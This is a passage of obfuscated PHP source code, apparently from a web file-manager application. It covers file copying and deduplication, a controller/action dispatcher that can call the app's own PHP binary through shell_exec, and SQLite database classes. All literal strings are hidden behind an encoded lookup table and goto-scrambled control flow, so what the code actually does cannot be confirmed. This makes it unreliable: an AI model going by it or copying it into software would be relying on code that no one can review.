$Bøœ’È«‘[$E…‹¾ìåˆ[75]] = $Cº®ÔĞ¼‡“->getPathInner($Bøœ’È«‘[$E…‹¾ìåˆ[75]]); $this->_copyChildTo($Cº®ÔĞ¼‡“, $Bøœ’È«‘[$E…‹¾ìåˆ[75]], $cµ¶åèÉÉ·, $b° “´ñ‹ë, $C‹õø„í¿º, $ağ²ğ…Ëğ»); } } goto D™¡è—×Ğë; dó¡à¾Šë: $AŠ±Ù´£Ç£ = array_merge($A¤ÁŞ³”¦É[$E…‹¾ìåˆ[73]], $A¤ÁŞ³”¦É[$E…‹¾ìåˆ[74]]); $d‚´­àà‹… = $this->_addFiles($Cº®ÔĞ¼‡“, $A¤ÁŞ³”¦É[$E…‹¾ìåˆ[73]], $ağ²ğ…Ëğ»); $b¶·×”ˆÆá = array(); goto cé÷õ’İÊÄ; cé÷õ’İÊÄ: foreach ($AŠ±Ù´£Ç£ as &$Bøœ’È«‘) { goto fõŠ„Ñ†¼; fÇï³ªŒÌ°: if ($b° “´ñ‹ë) { $b†´Ë‹…¬ = $this->fileNameExistCache($C·­¬ïô», $Bøœ’È«‘[$E…‹¾ìåˆ[28]]); if ($b†´Ë‹…¬) { if ($Bøœ’È«‘[$E…‹¾ìåˆ[366]] || $b° “´ñ‹ë == REPEAT_SKIP) { continue; } if ($b° “´ñ‹ë == REPEAT_REPLACE) { $dßÏè½’‹½ = $this->sourceInfoCache($b†´Ë‹…¬); $f¹«¡Í°…´ = $this->fileHistory($dßÏè½’‹½, $Bøœ’È«‘[$E…‹¾ìåˆ[414]], $Bøœ’È«‘[$E…‹¾ìåˆ[77]]); if ($f¹«¡Í°…´) { $C‹õø„í¿º[$E…‹¾ìåˆ[496]][] = $Bøœ’È«‘[$E…‹¾ìåˆ[414]]; } continue; } else { if ($b° “´ñ‹ë == REPEAT_RENAME) { $Bøœ’È«‘[$E…‹¾ìåˆ[28]] = $this->fileNameAutoCache($C·­¬ïô», $Bøœ’È«‘[$E…‹¾ìåˆ[28]], $b° “´ñ‹ë, !1); } } } } if (!$Bøœ’È«‘[$E…‹¾ìåˆ[366]] && $Bøœ’È«‘[$E…‹¾ìåˆ[414]]) { $C‹õø„í¿º[$E…‹¾ìåˆ[496]][] = $Bøœ’È«‘[$E…‹¾ìåˆ[414]]; } $b¶·×”ˆÆá[] = $this->_makeItemData($Bøœ’È«‘, $A›ßÉÊ¢÷ì, $Bøœ’È«‘[$E…‹¾ìåˆ[28]]); goto eÏ¦’›­Ö®; fÁÂ—±ÆŒ‚: $Bøœ’È«‘[$E…‹¾ìåˆ[77]] = _get($Bøœ’È«‘, $E…‹¾ìåˆ[77], 0); $Bøœ’È«‘[$E…‹¾ìåˆ[414]] = _get($Bøœ’È«‘, $E…‹¾ìåˆ[414], 0); if (!isset($Bøœ’È«‘[$E…‹¾ìåˆ[536]]) && $Bøœ’È«‘[$E…‹¾ìåˆ[414]]) { $C‹õø„í¿º[$E…‹¾ìåˆ[533]][] = $Bøœ’È«‘[$E…‹¾ìåˆ[414]]; } goto fÇï³ªŒÌ°; fõŠ„Ñ†¼: if (isset($d‚´­àà‹…[$Bøœ’È«‘[$E…‹¾ìåˆ[28]]])) { $Bøœ’È«‘ = $d‚´­àà‹…[$Bøœ’È«‘[$E…‹¾ìåˆ[28]]]; } $Bøœ’È«‘[$E…‹¾ìåˆ[366]] = $Bøœ’È«‘[$E…‹¾ìåˆ[29]] == $E…‹¾ìåˆ[76]; $Bøœ’È«‘[$E…‹¾ìåˆ[368]] = _get($Bøœ’È«‘, $E…‹¾ìåˆ[156], $E…‹¾ìåˆ[33]); goto fÁÂ—±ÆŒ‚; eÏ¦’›­Ö®: } unset($Bøœ’È«‘); if (!empty($b¶·×”ˆÆá)) { $this->addAll($b¶·×”ˆÆá); } goto fì†Ş°–; eÒÍöé£èô: $E…‹¾ìåˆ =& $_SERVER[Õİõş]; $A›ßÉÊ¢÷ì = $this->sourceInfoCache($C·­¬ïô»); $A¤ÁŞ³”¦É = $Cº®ÔĞ¼‡“->listPath($D›Ù›ÍâÁ, !1, !0); goto dó¡à¾Šë; D™¡è—×Ğë: } private function _addFiles($fëŒÌ¶“¡¶, $eÈÃ„áğÌ, $b§ßŞ‹šÕ‡) { goto bšŒˆ¹éŸ‰; FÔ°¶åÄãâ: $Aç•Ø°ªº = array(); foreach ($eÈÃ„áğÌ as $Eß• ˆïÏ) { if (isset($Eß• ˆïÏ[$f³³ò…ğê[536]]) && $Eß• ˆïÏ[$f³³ò…ğê[536]]) { continue; } $dà¸°Ü‘ƒ“ = $fëŒÌ¶“¡¶->getPathInner($Eß• ˆïÏ[$f³³ò…ğê[75]]); $F‚áÌ˜†…  = $F–ŠÔ„®Ê->addFileMake($dà¸°Ü‘ƒ“, $Eß• ˆïÏ[$f³³ò…ğê[77]], $Eß• ˆïÏ[$f³³ò…ğê[160]], $Eß• ˆïÏ[$f³³ò…ğê[159]], $Eß• ˆïÏ[$f³³ò…ğê[28]], $b§ßŞ‹šÕ‡); $Aç•Ø°ªº[] = $F‚áÌ˜†… ; } $F–ŠÔ„®Ê->addAll($Aç•Ø°ªº); goto Eø„åˆÏàÄ; cÒÃ„™±óÊ: foreach ($eÈÃ„áğÌ as &$A‚Íñ‹Á) { goto bìŸ—öñõ·; A‚˜³ˆ¤À¬: $cÃ†©…áÕÌ = $fëŒÌ¶“¡¶->hashMd5($A‚Íñ‹Á[$f³³ò…ğê[75]]); if (strlen($cÃ†©…áÕÌ) > 10 && !isset($CÓ¦—‡‹ó[$cÃ†©…áÕÌ])) { $CÓ¦—‡‹ó[$cÃ†©…áÕÌ] = array(); } $A‚Íñ‹Á[$f³³ò…ğê[160]] = $FÓÂ³·Öê; goto B˜Ó§Äãîİ; B˜Ó§Äãîİ: $A‚Íñ‹Á[$f³³ò…ğê[159]] = $cÃ†©…áÕÌ; Hook::trigger($f³³ò…ğê[538], $A‚Íñ‹Á); $CÓ¦—‡‹ó[$cÃ†©…áÕÌ][] =& $A‚Íñ‹Á; goto a¹‘òÖóÌ; bìŸ—öñõ·: Hook::trigger($f³³ò…ğê[537], $A‚Íñ‹Á); $A‚Íñ‹Á[$f³³ò…ğê[75]] = $fëŒÌ¶“¡¶->getPathInner($A‚Íñ‹Á[$f³³ò…ğê[75]]); $FÓÂ³·Öê = $fëŒÌ¶“¡¶->hashSimple($A‚Íñ‹Á[$f³³ò…ğê[75]]); goto A‚˜³ˆ¤À¬; a¹‘òÖóÌ: if (count($CÓ¦—‡‹ó[$cÃ†©…áÕÌ]) > 1) { $A‚Íñ‹Á[$f³³ò…ğê[536]] = !0; } goto BŸÎÑö™í; BŸÎÑö™í: } $Eë”Ø…¥åÊ = array($f³³ò…ğê[159] => array($f³³ò…ğê[7], array_keys($CÓ¦—‡‹ó))); $F–ŠÔ„®Ê = Model($f³³ò…ğê[539]); goto cğßÙ‡¦Ç®; cğßÙ‡¦Ç®: $eíÛ·Îõƒí = $F–ŠÔ„®Ê->where($Eë”Ø…¥åÊ)->select(); $eíÛ·Îõƒí = $eíÛ·Îõƒí ? $eíÛ·Îõƒí : array(); foreach ($eíÛ·Îõƒí as $dâµš‹¦ò) { if (!isset($CÓ¦—‡‹ó[$dâµš‹¦ò[$f³³ò…ğê[159]]])) { continue; } $Aà³²Ú‡¦× = $CÓ¦—‡‹ó[$dâµš‹¦ò[$f³³ò…ğê[159]]]; foreach ($Aà³²Ú‡¦× as &$A‚Íñ‹Á) { $A‚Íñ‹Á[$f³³ò…ğê[414]] = $dâµš‹¦ò[$f³³ò…ğê[414]]; $A‚Íñ‹Á[$f³³ò…ğê[536]] = !0; } unset($A‚Íñ‹Á); } goto FÔ°¶åÄãâ; bšŒˆ¹éŸ‰: $f³³ò…ğê =& $_SERVER[Õİõş]; if (!$eÈÃ„áğÌ || count($eÈÃ„áğÌ) == 0) { return array(); } $CÓ¦—‡‹ó = array(); goto cÒÃ„™±óÊ; Eø„åˆÏàÄ: $Eë”Ø…¥åÊ = array($f³³ò…ğê[159] => array($f³³ò…ğê[7], array_keys($CÓ¦—‡‹ó))); $eíÛ·Îõƒí = $F–ŠÔ„®Ê->where($Eë”Ø…¥åÊ)->select(); $eíÛ·Îõƒí = $eíÛ·Îõƒí ? $eíÛ·Îõƒí : array(); goto E¡î¬õÃÓ½; b©îŠÄÛ¢Î: return $D¬ññÊ¸ßì; goto A×ÎæçÇ½; E¡î¬õÃÓ½: foreach ($eíÛ·Îõƒí as $dâµš‹¦ò) { if (!isset($CÓ¦—‡‹ó[$dâµš‹¦ò[$f³³ò…ğê[159]]])) { continue; } $dùó°Ÿ‰Š  =& $CÓ¦—‡‹ó[$dâµš‹¦ò[$f³³ò…ğê[159]]]; foreach ($dùó°Ÿ‰Š  as &$A‚Íñ‹Á) { $A‚Íñ‹Á[$f³³ò…ğê[414]] = $dâµš‹¦ò[$f³³ò…ğê[414]]; } unset($A‚Íñ‹Á); } $D¬ññÊ¸ßì = array(); foreach ($eÈÃ„áğÌ as $Böæİ³¼‹ƒ) { $D¬ññÊ¸ßì[$Böæİ³¼‹ƒ[$f³³ò…ğê[28]]] = $Böæİ³¼‹ƒ; } goto b©îŠÄÛ¢Î; A×ÎæçÇ½: } } define($_SERVER[Õİõş][540], $_SERVER[Õİõş][541]); goto CÚñğÖ¹…; C–ìå…™‚ì: function ActionCall($F†¨¬¿çŠÖ) { $dâ©ÂÑÙˆ± = array_slice(func_get_args(), 1); return ActionApply($F†¨¬¿çŠÖ, $dâ©ÂÑÙˆ±); } function ActionCallApi($f¦ÚæºÅ•Î, $cò¯÷Òœ¢ = '') { goto b”ñ Á¢ï; b”ñ Á¢ï: $bÉ…è–é½Á =& $_SERVER[†ı´]; $cÄ¡˜ °·ğ = $cò¯÷Òœ¢; if (is_array($cò¯÷Òœ¢)) { $cÄ¡˜ °·ğ = $bÉ…è–é½Á[20]; foreach ($cò¯÷Òœ¢ as $BÛÏ•ÍÍÉÖ => $BÃî™¬ò¼è) { $BÃî™¬ò¼è = is_array($BÃî™¬ò¼è) ? json_encode($BÃî™¬ò¼è) : $BÃî™¬ò¼è; $BÃî™¬ò¼è = is_bool($BÃî™¬ò¼è) ? intval($BÃî™¬ò¼è) : $BÃî™¬ò¼è; $cÄ¡˜ °·ğ .= $bÉ…è–é½Á[21] . $BÛÏ•ÍÍÉÖ . $bÉ…è–é½Á[22] . rawurlencode($BÃî™¬ò¼è); } } goto f©¸ñº Ø; f´¨·¹¨©: $a»Í…ÒñŒ¡ = json_decode($eä§ó…», !0); $dÜÜ§‘Ö™Á = is_array($a»Í…ÒñŒ¡) ? $a»Í…ÒñŒ¡ : array($bÉ…è–é½Á[33] => null, $bÉ…è–é½Á[34] => $eä§ó…»); if (!$a»Í…ÒñŒ¡) { echo $eä§ó…»; } goto B“•´İ; f©¸ñº Ø: $E†‹ÊÕËÉÌ = Action($bÉ…è–é½Á[23])->accessToken(); $f¦ÚæºÅ•Î = str_replace($bÉ…è–é½Á[5], $bÉ…è–é½Á[4], $f¦ÚæºÅ•Î) . $bÉ…è–é½Á[24] . $E†‹ÊÕËÉÌ . $cÄ¡˜ °·ğ; $eä§ó…» = $bÉ…è–é½Á[20]; goto AæœÍğÎĞ; AæœÍğÎĞ: $CæÅŸ‘‡¿Ï = phpBinCommand(); if ($CæÅŸ‘‡¿Ï && function_exists($bÉ…è–é½Á[25])) { $DŒ§µŒ®ºŒ = $CæÅŸ‘‡¿Ï . $bÉ…è–é½Á[26] . BASIC_PATH . $bÉ…è–é½Á[27] . escapeshellarg($f¦ÚæºÅ•Î); $eä§ó…» = shell_exec($DŒ§µŒ®ºŒ); } if (!$eä§ó…») { $eªßõ›Ã‚¸ = stream_context_create(array($bÉ…è–é½Á[28] => array($bÉ…è–é½Á[29] => 20, $bÉ…è–é½Á[30] => $bÉ…è–é½Á[31]))); $eä§ó…» = file_get_contents(APP_HOST . $bÉ…è–é½Á[32] . $f¦ÚæºÅ•Î, !1, $eªßõ›Ã‚¸); } goto f´¨·¹¨©; B“•´İ: return $dÜÜ§‘Ö™Á; goto cƒé¡¦×‡Ë; cƒé¡¦×‡Ë: } function ActionCallHook($fŠèÇ¹¯÷) { goto D¿Ø¼£ŞÚè; eõ•ö§•¬³: $GLOBALS[$F£»¦“£ø[35]] = 1; $bêçø…ŒëÑ = ActionApply($fŠèÇ¹¯÷, $fÒ“Üƒ‰”§); $eˆ¢¬Ä¡† = ob_get_clean(); goto bù·÷‹ Å’; D¿Ø¼£ŞÚè: $F£»¦“£ø =& $_SERVER[†ı´]; ob_start(); $fÒ“Üƒ‰”§ = array_slice(func_get_args(), 1); goto eõ•ö§•¬³; bù·÷‹ Å’: $bêçø…ŒëÑ = $eˆ¢¬Ä¡† ? json_decode($eˆ¢¬Ä¡†, !0) : $bêçø…ŒëÑ; $GLOBALS[$F£»¦“£ø[35]] = 0; return $bêçø…ŒëÑ; goto D¬¬ÏĞ¯¬°; D¬¬ÏĞ¯¬°: } goto F–àéí‘¯ß; cªÉêÇ‰‹ù: register_shutdown_function($_SERVER[†ı´][36]); set_error_handler($_SERVER[†ı´][49], $EºãÆÌÒÊö); if (function_exists($_SERVER[†ı´][50])) { set_exception_handler($_SERVER[†ı´][51]); } goto E¾ÅÊË§©é; C–æš–„æÜ: function Action($f¿·×÷‡ñ = '') { goto bˆ¹ˆ±Ö˜…; añ…®Ú…œÙ: if (isset($d†‚’ïàÇÛ[$f˜í¨§—Õ])) { return $d†‚’ïàÇÛ[$f˜í¨§—Õ]; } $f¿·×÷‡ñ = trim(str_replace($dˆÚİÆ¥ á[4], $dˆÚİÆ¥ á[5], $f¿·×÷‡ñ), $dˆÚİÆ¥ á[4]); $e½–˜Úùº = explode($dˆÚİÆ¥ á[5], $f¿·×÷‡ñ); goto e¬š‡×ï¤; A×®™æ÷µ”: $d†‚’ïàÇÛ[$A†—¼ï…Ê„] = new $C×ìª¡Ú…™(); $d†‚’ïàÇÛ[$f˜í¨§—Õ] = $d†‚’ïàÇÛ[$A†—¼ï…Ê„]; return $d†‚’ïàÇÛ[$A†—¼ï…Ê„]; goto cø³ÚŸÜ¿Í; bˆ¹ˆ±Ö˜…: $dˆÚİÆ¥ á =& $_SERVER[†ı´]; static $d†‚’ïàÇÛ = array(); $f˜í¨§—Õ = $f¿·×÷‡ñ; goto añ…®Ú…œÙ; BŸ×ŠÌö’å: if (isset($d†‚’ïàÇÛ[$A†—¼ï…Ê„])) { return $d†‚’ïàÇÛ[$A†—¼ï…Ê„]; } if (is_file($eäåº½µ…À)) { include_once $eäåº½µ…À; } if (!class_exists($C×ìª¡Ú…™)) { return actionCallError("\x5b{$f¿·×÷‡ñ}\x20\x3d\76\x20{$C×ìª¡Ú…™}\135\x20\x63\x6c\141\x73\163\x20\x6e\157\164\40\x65\170\x69\163\x74\x73\x21"); } goto A×®™æ÷µ”; e¬š‡×ï¤: $d¥³Û¢© = strtolower($e½–˜Úùº[0]); if (substr($d¥³Û¢©, -6) == $dˆÚİÆ¥ á[6]) { $f¿·×÷‡ñ = substr($e½–˜Úùº[0], 0, -6); $C×ìª¡Ú…™ = $f¿·×÷‡ñ . $dˆÚİÆ¥ á[7]; $eäåº½µ…À = $dˆÚİÆ¥ á[8]; if (isset($e½–˜Úùº[1]) && substr(strtolower($e½–˜Úùº[1]), -5) == $dˆÚİÆ¥ á[9]) { $C×ìª¡Ú…™ = $f¿·×÷‡ñ . $e½–˜Úùº[1]; $eäåº½µ…À = $dˆÚİÆ¥ á[10] . $e½–˜Úùº[1] . $dˆÚİÆ¥ á[11]; } else { if (count($e½–˜Úùº) == 3) { $C×ìª¡Ú…™ = $f¿·×÷‡ñ . $e½–˜Úùº[1] . $e½–˜Úùº[2]; $eäåº½µ…À = $dˆÚİÆ¥ á[12] . $e½–˜Úùº[1] . $dˆÚİÆ¥ á[13] . $e½–˜Úùº[2] . $dˆÚİÆ¥ á[11]; } } $eäåº½µ…À = PLUGIN_DIR . $f¿·×÷‡ñ . $dˆÚİÆ¥ á[4] . $eäåº½µ…À; } else { if (substr($d¥³Û¢©, -5) == $dˆÚİÆ¥ á[9]) { $f¿·×÷‡ñ = substr($e½–˜Úùº[0], 0, -5); return Model($f¿·×÷‡ñ); } else { $C×ìª¡Ú…™ = $e½–˜Úùº[0] . $e½–˜Úùº[1]; $eäåº½µ…À = CONTROLLER_DIR . $e½–˜Úùº[0] . $dˆÚİÆ¥ á[4] . $e½–˜Úùº[1] . $dˆÚİÆ¥ á[14]; } } $A†—¼ï…Ê„ = strtolower($C×ìª¡Ú…™); goto BŸ×ŠÌö’å; cø³ÚŸÜ¿Í: } function ActionApply($BµÎïŸØÂË, $b„¬ˆ‡ÓÍç = array()) { goto DÅÊÊ˜¶ĞÎ; DÅÊÊ˜¶ĞÎ: if (is_array($BµÎïŸØÂË)) { return call_user_func_array($BµÎïŸØÂË, $b„¬ˆ‡ÓÍç); } if (function_exists($BµÎïŸØÂË)) { return call_user_func_array($BµÎïŸØÂË, $b„¬ˆ‡ÓÍç); } $A†àà„á— = strrpos($BµÎïŸØÂË, $_SERVER[†ı´][5]); goto bŸŞùé¹àÉ; bŸŞùé¹àÉ: $eì¾½í‹” = substr($BµÎïŸØÂË, 0, $A†àà„á—); $e¶”âÒ‚¸ğ = substr($BµÎïŸØÂË, $A†àà„á— + 1); $d¸×†ŠŸÇ = Action($eì¾½í‹”); goto AË±ÕœÍ–Í; AË±ÕœÍ–Í: if (!method_exists($d¸×†ŠŸÇ, $e¶”âÒ‚¸ğ)) { return actionCallError("{$BµÎïŸØÂË}\x20\155\145\x74\150\x6f\x64\40\156\x6f\x74\40\145\170\x69\163\164\x73\x21"); } $dÛè–É‘ = call_user_func_array(array($d¸×†ŠŸÇ, $e¶”âÒ‚¸ğ), $b„¬ˆ‡ÓÍç); return $dÛè–É‘; goto c¬ÛÅ³®Ûç; c¬ÛÅ³®Ûç: } function actionCallError($cğ‡İÍ„°¡) { $FÑï ŒÉŒŸ =& $_SERVER[†ı´]; $féÈë¾ìÆ = json_encode_force(array($FÑï ŒÉŒŸ[15] => this_url(), $FÑï ŒÉŒŸ[16] => $GLOBALS[$FÑï ŒÉŒŸ[16]])); $féÈë¾ìÆ = str_replace(array($FÑï ŒÉŒŸ[17]), array($FÑï ŒÉŒŸ[4]), $féÈë¾ìÆ); return write_log($cğ‡İÍ„°¡ . $FÑï ŒÉŒŸ[18] . $féÈë¾ìÆ, $FÑï ŒÉŒŸ[19]); } goto C–ìå…™‚ì; EÂšÅŸšÀ: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { goto F­©®ŞÓÜ¤; F­©®ŞÓÜ¤: $däÚì¬İ²‡ =& $_SERVER[Õİõş]; global $in, $config; $this->config =& $config; goto d–ÃÓ°ÅÕ¦; B–£ƒà§œó: $this->tpl = TEMPLATE . MOD . $däÚì¬İ²‡[8]; $this->_classObjectID = mt_rand(0, 10000); goto b¯òãŠ÷Ú; d–ÃÓ°ÅÕ¦: $this->in =& $in; $this->values[$däÚì¬İ²‡[6]] =& $config; $this->values[$däÚì¬İ²‡[7]] =& $in; goto B–£ƒà§œó; b¯òãŠ÷Ú: } public function loadClass($a„À†™áö) { if (1 === func_num_args()) { $this->{$a„À†™áö} = new $a„À†™áö(); } else { $fˆ‹Ä‚õ»Î = new ReflectionClass($a„À†™áö); $e©ÄñÑ©¿¹ = func_get_args(); array_shift($e©ÄñÑ©¿¹); $this->{$a„À†™áö} = $fˆ‹Ä‚õ»Î->newInstanceArgs($e©ÄñÑ©¿¹); } return $this->{$a„À†™áö}; } protected function assign($BÖ‡‡†Ñ¡, $A«Ãã‹çÓ) { $this->values[$BÖ‡‡†Ñ¡] = $A«Ãã‹çÓ; } protected function display($e‰¶¹ØÉ°‘) { ob_end_clean(); extract($this->values); require $this->tpl . $e‰¶¹ØÉ°‘; } } class DbSqliteBase extends Db { public function __construct($C¢ÄõÂÏ÷Ñ = '') { $cˆ´–ÏöÓ« =& $_SERVER[Õİõş]; if (!extension_loaded($cˆ´–ÏöÓ«[9])) { think_exception(think_lang($cˆ´–ÏöÓ«[10]) . $cˆ´–ÏöÓ«[11]); } if (!empty($C¢ÄõÂÏ÷Ñ)) { if (!isset($C¢ÄõÂÏ÷Ñ[$cˆ´–ÏöÓ«[12]])) { $C¢ÄõÂÏ÷Ñ[$cˆ´–ÏöÓ«[12]] = 438; } $this->config = $C¢ÄõÂÏ÷Ñ; if (empty($this->config[$cˆ´–ÏöÓ«[13]])) { $this->config[$cˆ´–ÏöÓ«[13]] = array(); } } } public function connect($A‚Üä•±·¤ = '', $a¡Ã¡¹×å = 0) { $A¼¨îÃòŠ  =& $_SERVER[Õİõş]; if (!isset($this->linkID[$a¡Ã¡¹×å])) { goto C‰İÉ††Ìø; C‰İÉ††Ìø: if (empty($A‚Üä•±·¤)) { $A‚Üä•±·¤ = $this->config; } $c†ñÙ²“” = !empty($A‚Üä•±·¤[$A¼¨îÃòŠ [13]][$A¼¨îÃòŠ [14]]) ? $A‚Üä•±·¤[$A¼¨îÃòŠ [13]][$A¼¨îÃòŠ [14]] : $this->pconnect; $cğˆÎ–î¨ = $c†ñÙ²“” ? $A¼¨îÃòŠ [15] : $A¼¨îÃòŠ [16]; goto aº¢Ğµ¼ã; CÁœ³ÎÈ: @sqlite_busy_timeout($this->linkID[$a¡Ã¡¹×å], 30000); if (1 != think_config($A¼¨îÃòŠ [18])) { unset($this->config); } goto d¼•©ìÙï; aº¢Ğµ¼ã: $this->linkID[$a¡Ã¡¹×å] = $cğˆÎ–î¨($A‚Üä•±·¤[$A¼¨îÃòŠ [17]], $A‚Üä•±·¤[$A¼¨îÃòŠ [12]]); if (!$this->linkID[$a¡Ã¡¹×å]) { think_exception(sqlite_error_string()); } $this->connected = !0; goto CÁœ³ÎÈ; d¼•©ìÙï: } return $this->linkID[$a¡Ã¡¹×å]; } public function free() { $this->queryID = null; } public function query($DË‰é·Ø¨Â) { goto Bè„„ßğİ¹; dí×¥À¶©ñ: think_status($e³‡ï÷µ‚[20]); $this->queryID = sqlite_query($this->_linkID, $DË‰é·Ø¨Â); $this->debug(); goto AÅÆ¤íóÂÖ; Bè„„ßğİ¹: $e³‡ï÷µ‚ =& $_SERVER[Õİõş]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto aà´“¸ÀóÆ; aà´“¸ÀóÆ: $this->queryStr = $DË‰é·Ø¨Â; if ($this->queryID) { $this->free(); } think_action_status($e³‡ï÷µ‚[19], 1); goto dí×¥À¶©ñ; AÅÆ¤íóÂÖ: if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $CÅÁê—¨¢ = $this->getAll(); return $CÅÁê—¨¢; } goto aö¡ƒìÖ°; aö¡ƒìÖ°: } public function execute($B¦Ü°Øç®å) { goto CóíøÒÕà“; f‡›‘¶÷ÇÖ: $this->queryStr = $B¦Ü°Øç®å; if ($this->queryID) { $this->free(); } think_action_status($AÏ²˜Î—‡†[21], 1); goto AŠİíÔŒø‘; CóíøÒÕà“: $AÏ²˜Î—‡† =& $_SERVER[Õİõş]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto f‡›‘¶÷ÇÖ; eôÊî˜º‘: if (!1 === $D‰±ø”½’‚) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } goto FÀÙã–óï²; AŠİíÔŒø‘: think_status($AÏ²˜Î—‡†[20]); $D‰±ø”½’‚ = sqlite_exec($this->_linkID, $B¦Ü°Øç®å); $this->debug(); goto eôÊî˜º‘; FÀÙã–óï²: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[Õİõş][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $aî®†íá…Ÿ = sqlite_query($this->_linkID, $_SERVER[Õİõş][23]); if (!$aî®†íá…Ÿ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $a»µ¹¡« = sqlite_query($this->_linkID, $_SERVER[Õİõş][24]); if (!$a»µ¹¡«) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $F—¤…ò˜ = array(); if ($this->numRows > 0) { for ($A“Ó¬¦½”Ù = 0; $A“Ó¬¦½”Ù < $this->numRows; $A“Ó¬¦½”Ù++) { $F—¤…ò˜[$A“Ó¬¦½”Ù] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $F—¤…ò˜; } public function getFields($CÖ”âÎÚÛê) { $EÖÌÔÆùˆÆ =& $_SERVER[Õİõş]; $AÓ‡Õœà× = $this->query($EÖÌÔÆùˆÆ[25] . $CÖ”âÎÚÛê . $EÖÌÔÆùˆÆ[26]); $Fô‡â¸Ñ°‰ = array(); if ($AÓ‡Õœà×) { foreach ($AÓ‡Õœà× as $F½Òª¦êç => $B°˜â–ŸçÍ) { $Fô‡â¸Ñ°‰[$B°˜â–ŸçÍ[$EÖÌÔÆùˆÆ[27]]] = array($EÖÌÔÆùˆÆ[28] => $B°˜â–ŸçÍ[$EÖÌÔÆùˆÆ[27]], $EÖÌÔÆùˆÆ[29] => $B°˜â–ŸçÍ[$EÖÌÔÆùˆÆ[30]], $EÖÌÔÆùˆÆ[31] => (bool) ($B°˜â–ŸçÍ[$EÖÌÔÆùˆÆ[32]] === $EÖÌÔÆùˆÆ[33]), $EÖÌÔÆùˆÆ[34] => $B°˜â–ŸçÍ[$EÖÌÔÆùˆÆ[35]], $EÖÌÔÆùˆÆ[36] => strtolower($B°˜â–ŸçÍ[$EÖÌÔÆùˆÆ[37]]) == $EÖÌÔÆùˆÆ[38], $EÖÌÔÆùˆÆ[39] => strtolower($B°˜â–ŸçÍ[$EÖÌÔÆùˆÆ[40]]) == $EÖÌÔÆùˆÆ[41]); } } return $Fô‡â¸Ñ°‰; } public function getTables($E‘§Î‚ïß‰ = '') { $Bíñ°ºª„‡ =& $_SERVER[Õİõş]; $a¡µºÒ÷Çˆ = $this->query($Bíñ°ºª„‡[42] . $Bíñ°ºª„‡[43] . $Bíñ°ºª„‡[44]); $bŒØ¼åè¸ = array(); foreach ($a¡µºÒ÷Çˆ as $CñëŠš¹Ù => $e£Œ©è¬) { $bŒØ¼åè¸[$CñëŠš¹Ù] = current($e£Œ©è¬); } return $bŒØ¼åè¸; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $dâ³·ÃÇ¾ =& $_SERVER[Õİõş]; $f¥ÕéÒ’À = sqlite_last_error($this->_linkID); $this->error = $f¥ÕéÒ’À . $dâ³·ÃÇ¾[4] . sqlite_error_string($f¥ÕéÒ’À); if ($dâ³·ÃÇ¾[33] != $this->queryStr) { $this->error .= LNG($dâ³·ÃÇ¾[45]) . $this->queryStr; } think_trace($this->error, $dâ³·ÃÇ¾[33], $dâ³·ÃÇ¾[46]); return $this->error; } public function escapeString($Dº®Ê¬–) { return sqlite_escape_string($Dº®Ê¬–); } public function parseLimit($dí¼¨ÉåÚÜ) { $e°„Òº²ÜŸ =& $_SERVER[Õİõş]; $cÀÙğŸˆ›Ö = $e°„Òº²ÜŸ[33]; if (!empty($dí¼¨ÉåÚÜ)) { $dí¼¨ÉåÚÜ = explode($e°„Òº²ÜŸ[47], $dí¼¨ÉåÚÜ); if (count($dí¼¨ÉåÚÜ) > 1) { $cÀÙğŸˆ›Ö .= $e°„Òº²ÜŸ[48] . $dí¼¨ÉåÚÜ[1] . $e°„Òº²ÜŸ[49] . $dí¼¨ÉåÚÜ[0] . $e°„Òº²ÜŸ[50]; } else { $cÀÙğŸˆ›Ö .= $e°„Òº²ÜŸ[48] . $dí¼¨ÉåÚÜ[0] . $e°„Òº²ÜŸ[50]; } } return $cÀÙğŸˆ›Ö; } } class DbSqlite3Base extends Db { public function __construct($AÓÈ©ÔˆÆ = '') { $F¤†œÃÁ»¨ =& $_SERVER[Õİõş]; if (!class_exists($F¤†œÃÁ»¨[51])) { think_exception(think_lang($F¤†œÃÁ»¨[10]) . $F¤†œÃÁ»¨[52]); } if (!empty($AÓÈ©ÔˆÆ)) { if (!isset($AÓÈ©ÔˆÆ[$F¤†œÃÁ»¨[12]])) { $AÓÈ©ÔˆÆ[$F¤†œÃÁ»¨[12]] = 438; } $this->config = $AÓÈ©ÔˆÆ; if (empty($this->config[$F¤†œÃÁ»¨[13]])) { $this->config[$F¤†œÃÁ»¨[13]] = array(); } } } public function connect($B«Èî°ÉÍ = '', $AÍä‚¾ºù’ = 0) { $eàÅ½Õ‚¦® =& $_SERVER[Õİõş]; if (!isset($this->linkID[$AÍä‚¾ºù’])) { if (empty($B«Èî°ÉÍ)) { $B«Èî°ÉÍ = $this->config; } $this->linkID[$AÍä‚¾ºù’] = new SQLite3($B«Èî°ÉÍ[$eàÅ½Õ‚¦®[17]]); if (!$this->linkID[$AÍä‚¾ºù’]) { think_exception($this->linkID[$AÍä‚¾ºù’]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$AÍä‚¾ºù’]->busyTimeout(30000); if (1 != think_config($eàÅ½Õ‚¦®[18])) { unset($this->config); } } return $this->linkID[$AÍä‚¾ºù’]; } public function free() { $this->queryID = null; } public function query($c…¶”Ï«) { goto FÓ›ÏªƒÍå; Aª¹†ÊÜÃ›: think_status($aİãë—ŠÙ™[20]); $this->queryID = $this->_linkID->query($c…¶”Ï«); $this->debug(); goto d¥éÎÁÒíš; cµ‘÷«‹®ß: $this->queryStr = $c…¶”Ï«; if ($this->queryID) { $this->free(); } think_action_status($aİãë—ŠÙ™[19], 1); goto 